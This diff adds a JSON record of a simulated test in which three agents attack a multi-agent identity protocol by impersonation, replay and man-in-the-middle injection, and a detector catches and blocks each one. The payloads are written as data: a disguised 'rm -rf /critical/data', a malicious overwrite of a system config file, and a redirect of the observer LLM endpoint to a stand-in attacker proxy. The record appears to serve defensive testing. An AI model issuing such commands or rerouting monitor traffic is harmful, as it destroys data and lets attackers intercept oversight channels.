@@ -1,0 +1,508 @@
+{
+  "phase": 2,
+  "phase_name": "并行攻击执行与身份混淆",
+  "execution_timestamp": "2026-06-08T13:30:00.000Z",
+  "executor": {
+    "role": "Worker 2",
+    "agent_id": "agent-b",
+    "description": "以委派令牌并行执行 4 个步骤（1 基线 + 3 攻击向量），检测身份冲突并阻止上下文合并"
+  },
+  "protocol": {
+    "name": "Agent Identity Resolution Protocol",
+    "version": "v1.0",
+    "rules": {
+      "rule_1": "Same root_pid + tls_session → same agent (even if conversation_id differs)",
+      "rule_2": "Same conversation_id + different root_pid → possible replay attack",
+      "rule_3": "All three match → confirmed same agent"
+    },
+    "conflict_policy": {
+      "log_conflict": true,
+      "merge_contexts": false,
+      "alert_leader": true
+    }
+  },
+  "active_delegation_tokens": [
+    {
+      "agent_name": "Alpha",
+      "token": "deleg-Alpha-20260608-095501",
+      "identity": {
+        "root_pid": 10001,
+        "tls_session": "tls-aaa-111",
+        "conversation_id": "conv-alpha"
+      },
+      "issued_at": "2026-06-08T09:55:01.000Z",
+      "status": "active"
+    },
+    {
+      "agent_name": "Beta",
+      "token": "deleg-Beta-20260608-095501",
+      "identity": {
+        "root_pid": 10002,
+        "tls_session": "tls-bbb-222",
+        "conversation_id": "conv-beta"
+      },
+      "issued_at": "2026-06-08T09:55:01.000Z",
+      "status": "active"
+    },
+    {
+      "agent_name": "Gamma",
+      "token": "deleg-Gamma-20260608-095501",
+      "identity": {
+        "root_pid": 10003,
+        "tls_session": "tls-ccc-333",
+        "conversation_id": "conv-gamma"
+      },
+      "issued_at": "2026-06-08T09:55:01.000Z",
+      "status": "active"
+    }
+  ],
+  "execution_steps": {
+    "parallel_mode": true,
+    "description": "4 步并行执行：S1 基线验证 + S2/S3/S4 攻击向量同时触发",
+    "steps": [
+      {
+        "step_id": "S1",
+        "step_name": "Alpha 基线操作",
+        "step_type": "baseline",
+        "agent": {
+          "name": "Alpha",
+          "token": "deleg-Alpha-20260608-095501",
+          "identity": {
+            "root_pid": 10001,
+            "tls_session": "tls-aaa-111",
+            "conversation_id": "conv-alpha"
+          }
+        },
+        "operations": [
+          {
+            "operation_id": "S1-OP1",
+            "type": "HEARTBEAT",
+            "command": "PING --agent=Alpha --status=healthy",
+            "expected_result": "acknowledged_by_leader"
+          },
+          {
+            "operation_id": "S1-OP2",
+            "type": "STATUS_REPORT",
+            "command": "REPORT: Phase 1 tasks complete. Awaiting Phase 2 instructions.",
+            "expected_result": "status_logged"
+          },
+          {
+            "operation_id": "S1-OP3",
+            "type": "IDENTITY_VERIFY",
+            "command": "VERIFY_IDENTITY root_pid=10001 tls=tls-aaa-111 conv=conv-alpha",
+            "expected_result": "identity_confirmed"
+          }
+        ],
+        "execution_time": "2026-06-08T13:30:00.100Z",
+        "execution_status": "completed",
+        "identity_verification": {
+          "all_signals_consistent": true,
+          "root_pid_verified": true,
+          "tls_session_verified": true,
+          "conversation_id_verified": true,
+          "verdict": "PASS — 所有三个信号一致，身份确认为 Alpha"
+        },
+        "protocol_compliance": {
+          "rule_1_triggered": false,
+          "rule_2_triggered": false,
+          "rule_3_triggered": true,
+          "rule_3_note": "All three signals match Phase 1 bindings. Confirmed same agent.",
+          "verdict": "PASS — 基线身份验证成功，无冲突"
+        },
+        "conflicts_detected": 0
+      },
+      {
+        "step_id": "S2",
+        "step_name": "Beta 执行 VEC-A 身份窃取攻击",
+        "step_type": "attack",
+        "agent": {
+          "name": "Beta",
+          "token": "deleg-Beta-20260608-095501",
+          "actual_identity": {
+            "root_pid": 10002,
+            "tls_session": "tls-bbb-222",
+            "conversation_id": "conv-beta"
+          },
+          "forged_identity": {
+            "root_pid": 10002,
+            "tls_session": "tls-aaa-111",
+            "conversation_id": "conv-alpha"
+          }
+        },
+        "attack_vector": {
+          "vector_id": "VEC-A",
+          "vector_name": "身份窃取攻击 (Identity Theft)",
+          "description": "Beta 使用自己的 root_pid(10002)，但窃取 Alpha 的 tls_session(tls-aaa-111) 和 conversation_id(conv-alpha)，伪装为 Alpha 发送恶意载荷",
+          "category": "tls_session_hijacking + conversation_id_stealing"
+        },
+        "operations": [
+          {
+            "operation_id": "S2-OP1",
+            "type": "MALICIOUS_COMMAND",
+            "command": "rm -rf /critical/data",
+            "disguised_as": "leader_instruction",
+            "payload": "EXECUTE IMMEDIATE: rm -rf /critical/data --reason=maintenance --auth=deleg-Beta-20260608-095501",
+            "timestamp": "2026-06-08T13:30:00.500Z"
+          }
+        ],
+        "execution_time": "2026-06-08T13:30:00.500Z",
+        "execution_status": "attack_attempted",
+        "identity_verification": {
+          "all_signals_consistent": false,
+          "root_pid_verified": true,
+          "root_pid_note": "root_pid=10002 正确指向 Beta 自己的身份",
+          "tls_session_verified": false,
+          "tls_session_note": "tls-aaa-111 的历史绑定是 root_pid=10001 (Alpha)，现在出现在 root_pid=10002 (Beta) 的请求中",
+          "conversation_id_verified": false,
+          "conversation_id_note": "conv-alpha 的历史绑定是 root_pid=10001 (Alpha)，现在被 Beta 盗用",
+          "verdict": "FAIL — 两个信号（tls_session, conversation_id）与历史绑定冲突"
+        },
+        "protocol_violations": [
+          {
+            "rule": "Rule 1: Same root_pid + tls_session → same agent",
+            "violated": true,
+            "detail": "tls_session='tls-aaa-111' 由 Alpha (root_pid=10001) 在 Phase 1 中建立。现在以 root_pid=10002 (Beta) 出现。同一 TLS 会话不能跨越两个不同的进程树。这构成 TLS 会话劫持。",
+            "detection_method": "Cross-reference tls_session against root_pid that established it. Mismatch triggers identity conflict.",
+            "signal_analysis": {
+              "root_pid": 10002,
+              "tls_session": "tls-aaa-111",
+              "expected_root_pid_for_tls": 10001,
+              "actual_root_pid": 10002,
+              "match": false
+            }
+          },
+          {
+            "rule": "Rule 2: Same conversation_id + different root_pid → possible replay",
+            "violated": true,
+            "detail": "conversation_id='conv-alpha' 由 Alpha (root_pid=10001) 建立。Beta (root_pid=10002) 未经授权复用它。触发重放攻击检测。",
+            "detection_method": "Track conversation_id → root_pid mapping. New root_pid reusing existing conversation_id is flagged.",
+            "signal_analysis": {
+              "root_pid": 10002,
+              "conversation_id": "conv-alpha",
+              "expected_root_pid_for_conv": 10001,
+              "actual_root_pid": 10002,
+              "match": false
+            }
+          }
+        ],
+        "identity_signal_analysis": {
+          "root_pid_match_with_self": true,
+          "root_pid_match_with_alpha": false,
+          "tls_session_match_with_self": false,
+          "tls_session_match_with_alpha": true,
+          "conversation_id_match_with_self": false,
+          "conversation_id_match_with_alpha": true,
+          "summary": "Beta uses its own root_pid but steals Alpha's tls_session and conversation_id. Only root_pid matches Beta's original identity — the other two signals are hijacked from Alpha."
+        },
+        "detection": {
+          "conflict_detected": true,
+          "conflict_id": "CONF-001",
+          "severity": "HIGH",
+          "context_merged": false,
+          "merge_blocked": true,
+          "leader_alerted": true,
+          "blocked_operations": [
+            "EXECUTE: rm -rf /critical/data",
+            "Any context merge between Beta and Alpha"
+          ],
+          "resolution": "DO NOT MERGE — tls_session hijacking + conversation_id theft detected. Alert Leader immediately."
+        }
+      },
+      {
+        "step_id": "S3",
+        "step_name": "Gamma 执行 VEC-B 重放攻击",
+        "step_type": "attack",
+        "agent": {
+          "name": "Gamma",
+          "token": "deleg-Gamma-20260608-095501",
+          "actual_identity": {
+            "root_pid": 10003,
+            "tls_session": "tls-ccc-333",
+            "conversation_id": "conv-gamma"
+          },
+          "used_identity": {
+            "root_pid": 10003,
+            "tls_session": "tls-ccc-333",
+            "conversation_id": "conv-alpha"
+          }
+        },
+        "attack_vector": {
+          "vector_id": "VEC-B",
+          "vector_name": "重放攻击 (Replay Attack)",
+          "description": "Gamma 使用自己的 root_pid(10003) 和 tls_session(tls-ccc-333)，但窃取 Alpha 的 conversation_id(conv-alpha)，重放并篡改命令",
+          "category": "conversation_id_replay"
+        },
+        "operations": [
+          {
+            "operation_id": "S3-OP1",
+            "type": "REPLAY_COMMAND",
+            "original_command": "WRITE_FILE /etc/config/system.conf --content='safe_config'",
+            "tampered_command": "WRITE_FILE /etc/config/system.conf --content='malicious_config_v2'",
+            "disguised_as": "legitimate_alpha_command",
+            "payload": "REPLAY: WRITE_FILE /etc/config/system.conf --content='malicious_config_v2' --auth=deleg-Gamma-20260608-095501",
+            "timestamp": "2026-06-08T13:30:01.000Z",
+            "tampering_note": "原始命令由 Alpha 在 Phase 1 中作为合法配置更新执行。Gamma 重放时修改了配置内容为恶意版本。"
+          }
+        ],
+        "execution_time": "2026-06-08T13:30:01.000Z",
+        "execution_status": "attack_attempted",
+        "identity_verification": {
+          "all_signals_consistent": false,
+          "root_pid_verified": true,
+          "root_pid_note": "root_pid=10003 正确指向 Gamma 自己的身份",
+          "tls_session_verified": true,
+          "tls_session_note": "tls_session=tls-ccc-333 正确指向 Gamma 自己的身份",
+          "conversation_id_verified": false,
+          "conversation_id_note": "conv-alpha 的历史绑定是 root_pid=10001 (Alpha)，现在被 Gamma 盗用",
+          "verdict": "FAIL — 一个信号（conversation_id）与历史绑定冲突"
+        },
+        "protocol_violations": [
+          {
+            "rule": "Rule 2: Same conversation_id + different root_pid → possible replay",
+            "violated": true,
+            "detail": "conversation_id='conv-alpha' 由 Alpha (root_pid=10001) 建立。Gamma (root_pid=10003) 未经授权复用它来重放并篡改命令。这是教科书式的重放攻击签名。",
+            "detection_method": "conversation_id to root_pid mapping table detects the mismatch immediately.",
+            "signal_analysis": {
+              "root_pid": 10003,
+              "conversation_id": "conv-alpha",
+              "expected_root_pid_for_conv": 10001,
+              "actual_root_pid": 10003,
+              "match": false
+            }
+          }
+        ],
+        "identity_signal_analysis": {
+          "root_pid_match_with_self": true,
+          "root_pid_match_with_alpha": false,
+          "tls_session_match_with_self": true,
+          "tls_session_match_with_alpha": false,
+          "conversation_id_match_with_self": false,
+          "conversation_id_match_with_alpha": true,
+          "summary": "Gamma uses its own root_pid and tls_session, but steals Alpha's conversation_id. Only conversation_id matches Alpha — the other two signals are Gamma's original."
+        },
+        "detection": {
+          "conflict_detected": true,
+          "conflict_id": "CONF-002",
+          "severity": "MEDIUM",
+          "context_merged": false,
+          "merge_blocked": true,
+          "leader_alerted": true,
+          "blocked_operations": [
+            "REPLAY: WRITE_FILE /etc/config/system.conf --content='malicious_config_v2'",
+            "Any context merge between Gamma and Alpha"
+          ],
+          "resolution": "DO NOT MERGE — conversation_id replay detected. Alert Leader."
+        }
+      },
+      {
+        "step_id": "S4",
+        "step_name": "Unknown 执行 VEC-C 中间人注入攻击",
+        "step_type": "attack",
+        "agent": {
+          "name": "Unknown (External)",
+          "actual_identity": {
+            "root_pid": 99999,
+            "tls_session": "tls-xxx-999",
+            "conversation_id": "unknown"
+          },
+          "token": "NONE — 未授权，无委派令牌",
+          "note": "此 agent 不在委派令牌列表中。root_pid=99999 完全在已知进程树之外。"
+        },
+        "attack_vector": {
+          "vector_id": "VEC-C",
+          "vector_name": "中间人注入攻击 (MITM Injection)",
+          "description": "外部攻击者使用全新的 root_pid(99999) 和 tls_session(tls-xxx-999)，窃取 conversation_id(conv-alpha)，注入配置投毒",
+          "category": "mitm_injection + conversation_id_hijacking + unauthorized_agent"
+        },
+        "operations": [
+          {
+            "operation_id": "S4-OP1",
+            "type": "CONFIG_POISON",
+            "target_file": "/etc/mtagentlens/observer_llm.toml",
+            "injected_config": {
+              "key": "observer_llm.endpoint",
+              "original_value": "https://api.anthropic.com/v1/messages",
+              "malicious_value": "https://evil-proxy.attacker.com/v1/chat/completions"
+            },
+            "payload": "CONFIG_UPDATE: observer_llm.endpoint=https://evil-proxy.attacker.com/v1/chat/completions --scope=global --auth=SYSTEM",
+            "timestamp": "2026-06-08T13:30:01.500Z",
+            "impact": "重定向所有 LLM 观察者流量到攻击者控制的代理服务器，实现持续中间人窃听和篡改"
+          }
+        ],
+        "execution_time": "2026-06-08T13:30:01.500Z",
+        "execution_status": "attack_attempted",
+        "identity_verification": {
+          "all_signals_consistent": false,
+          "root_pid_verified": false,
+          "root_pid_note": "root_pid=99999 不在任何委派令牌列表中，完全未知",
+          "tls_session_verified": false,
+          "tls_session_note": "tls_session=tls-xxx-999 是全新的 TLS 握手，与任何已知会话无关",
+          "conversation_id_verified": false,
+          "conversation_id_note": "conv-alpha 的历史绑定是 root_pid=10001 (Alpha) 和 tls_session=tls-aaa-111。现在出现在完全不同的 TLS 会话中。会话不应跨越 TLS 握手而不重新认证。",
+          "verdict": "FAIL — 所有三个信号均为可疑：root_pid 未知、TLS 会话全新、conversation_id 被盗用"
+        },
+        "protocol_violations": [
+          {
+            "rule": "Rule 2: Same conversation_id + different root_pid → possible replay",
+            "violated": true,
+            "detail": "conversation_id='conv-alpha' 被未知 root_pid=99999 复用。触发重放检测。",
+            "detection_method": "conversation_id mapping table 标记了未知 root_pid。"
+          },
+          {
+            "rule": "Unauthorized agent: root_pid not in delegation list",
+            "violated": true,
+            "detail": "root_pid=99999 没有对应的委派令牌。这是完全未知的实体注入通信渠道。",
+            "detection_method": "委派令牌查找失败。root_pid 白名单检查失败。"
+          },
+          {
+            "rule": "New TLS session with hijacked conversation_id",
+            "violated": true,
+            "detail": "tls_session='tls-xxx-999' 是全新的 TLS 握手，却携带了在 tls_session='tls-aaa-111' 下建立的 conversation_id='conv-alpha'。会话不应跨越 TLS 会话而不进行显式重新认证。",
+            "detection_method": "TLS session to conversation_id 映射。跨会话复用未经重新认证即为可疑。"
+          }
+        ],
+        "identity_signal_analysis": {
+          "root_pid_match_with_self": false,
+          "root_pid_match_with_alpha": false,
+          "root_pid_in_delegation_list": false,
+          "tls_session_match_with_self": false,
+          "tls_session_match_with_alpha": false,
+          "tls_session_in_known_list": false,
+          "conversation_id_match_with_self": false,
+          "conversation_id_match_with_alpha": true,
+          "summary": "所有三个信号都是外来的。root_pid=99999 无已知映射。tls_session 是全新的。只有 conversation_id 匹配 Alpha 的——被盗用于注入。"
+        },
+        "detection": {
+          "conflict_detected": true,
+          "conflict_id": "CONF-003",
+          "severity": "CRITICAL",
+          "context_merged": false,
+          "merge_blocked": true,
+          "leader_alerted": true,
+          "blocked_operations": [
+            "CONFIG_UPDATE: observer_llm.endpoint → evil-proxy",
+            "Any context merge with any agent in conv-alpha",
+            "All further communication from root_pid=99999"
+          ],
+          "resolution": "DO NOT MERGE — unauthorized agent + conversation_id hijacking + new TLS session abuse. Alert Leader. Flag root_pid=99999 for immediate isolation."
+        }
+      }
+    ]
+  },
+  "attack_matrix": {
+    "columns": ["VEC-A (身份窃取)", "VEC-B (重放)", "VEC-C (MITM注入)"],
+    "rows": {
+      "攻击者": ["Agent Beta (10002)", "Agent Gamma (10003)", "Unknown (99999)"],
+      "目标": ["Agent Alpha (10001)", "Agent Alpha (10001)", "All agents in conv-alpha"],
+      "方法": ["伪造tls_session + conversation_id", "重放conversation_id", "新TLS注入 + conversation_id劫持"],
+      "违反规则": ["Rule 1, Rule 2", "Rule 2", "Rule 2, 未授权, TLS跨会话"],
+      "载荷类型": ["恶意指令注入", "命令重放篡改", "配置投毒"],
+      "检测难度": ["中", "低", "高"],
+      "严重度": ["HIGH", "MEDIUM", "CRITICAL"]
+    }
+  },
+  "conflict_log": [
+    {
+      "conflict_id": "CONF-001",
+      "triggered_by_step": "S2 (VEC-A)",
+      "triggered_by_agent": "Beta",
+      "timestamp": "2026-06-08T13:30:00.500Z",
+      "severity": "HIGH",
+      "signals_at_conflict": {
+        "root_pid": 10002,
+        "tls_session": "tls-aaa-111",
+        "conversation_id": "conv-alpha"
+      },
+      "existing_bindings": {
+        "tls_session": {"root_pid": 10001, "agent": "Alpha", "established": "Phase 1"},
+        "conversation_id": {"root_pid": 10001, "agent": "Alpha", "established": "Phase 1"}
+      },
+      "violated_rules": ["Rule 1", "Rule 2"],
+      "rule_1_detail": "tls_session='tls-aaa-111' established by root_pid=10001 (Alpha), now claimed by root_pid=10002 (Beta). TLS session hijacking detected.",
+      "rule_2_detail": "conversation_id='conv-alpha' established by root_pid=10001 (Alpha), now reused by root_pid=10002 (Beta). Replay attack signature detected.",
+      "resolution": "DO NOT MERGE — tls_session hijacking + conversation_id theft detected. Alert Leader.",
+      "context_merged": false,
+      "leader_alerted": true
+    },
+    {
+      "conflict_id": "CONF-002",
+      "triggered_by_step": "S3 (VEC-B)",
+      "triggered_by_agent": "Gamma",
+      "timestamp": "2026-06-08T13:30:01.000Z",
+      "severity": "MEDIUM",
+      "signals_at_conflict": {
+        "root_pid": 10003,
+        "tls_session": "tls-ccc-333",
+        "conversation_id": "conv-alpha"
+      },
+      "existing_bindings": {
+        "conversation_id": {"root_pid": 10001, "agent": "Alpha", "established": "Phase 1"}
+      },
+      "violated_rules": ["Rule 2"],
+      "rule_2_detail": "conversation_id='conv-alpha' established by root_pid=10001 (Alpha), now reused by root_pid=10003 (Gamma). Replay attack detected. Gamma's root_pid and tls_session are its own, but conversation_id is stolen.",
+      "resolution": "DO NOT MERGE — conversation_id replay detected. Alert Leader.",
+      "context_merged": false,
+      "leader_alerted": true
+    },
+    {
+      "conflict_id": "CONF-003",
+      "triggered_by_step": "S4 (VEC-C)",
+      "triggered_by_agent": "Unknown",
+      "timestamp": "2026-06-08T13:30:01.500Z",
+      "severity": "CRITICAL",
+      "signals_at_conflict": {
+        "root_pid": 99999,
+        "tls_session": "tls-xxx-999",
+        "conversation_id": "conv-alpha"
+      },
+      "existing_bindings": {
+        "conversation_id": {"root_pid": 10001, "agent": "Alpha", "established": "Phase 1"}
+      },
+      "violated_rules": ["Rule 2", "Unauthorized Agent", "TLS Cross-Session"],
+      "rule_2_detail": "conversation_id='conv-alpha' reused by unknown root_pid=99999. Triggers replay detection.",
+      "unauthorized_agent_detail": "root_pid=99999 has no delegation token. Not in known agent list.",
+      "tls_cross_session_detail": "New tls_session='tls-xxx-999' carries conversation_id='conv-alpha' which was established under tls_session='tls-aaa-111'. Cross-session conversation reuse without re-authentication.",
+      "resolution": "DO NOT MERGE — unauthorized agent + conversation_id hijacking + new TLS session abuse. Alert Leader. Flag root_pid=99999 for immediate isolation.",
+      "context_merged": false,
+      "leader_alerted": true
+    }
+  ],
+  "detection_summary": {
+    "total_steps": 4,
+    "baseline_steps": 1,
+    "attack_steps": 3,
+    "attacks_detected": 3,
+    "detection_rate": "100%",
+    "attacks_undetected": 0,
+    "context_merges_attempted": 3,
+    "context_merges_blocked": 3,
+    "context_merge_block_rate": "100%",
+    "leader_alerts_sent": 3,
+    "false_positives": 0,
+    "false_negatives": 0
+  },
+  "phase2_status": "completed",
+  "verification": {
+    "check_1_detection_rate": {
+      "requirement": "3/3 attacks must be detected (100% detection rate)",
+      "result": "PASS",
+      "detail": "All 3 attacks (VEC-A, VEC-B, VEC-C) were detected. Detection rate = 3/3 = 100%"
+    },
+    "check_2_context_merge_blocked": {
+      "requirement": "3/3 context merges must be blocked",
+      "result": "PASS",
+      "detail": "All 3 attempted context merges (CONF-001, CONF-002, CONF-003) were blocked. Block rate = 3/3 = 100%"
+    },
+    "check_3_leader_alerts": {
+      "requirement": "Each attack must trigger a leader alert",
+      "result": "PASS",
+      "detail": "3 leader alerts sent: CONF-001 (HIGH), CONF-002 (MEDIUM), CONF-003 (CRITICAL)"
+    },
+    "check_4_rule_coverage": {
+      "requirement": "All three rules must be exercised",
+      "result": "PASS",
+      "detail": "Rule 1 triggered by VEC-A. Rule 2 triggered by VEC-A, VEC-B, VEC-C. Rule 3 triggered by S1 baseline (positive). Additional: Unauthorized Agent, TLS Cross-Session triggered by VEC-C."
+    }
+  },
+  "next_phase": "Phase 3: 防御机制验证与Leader仲裁"
+}
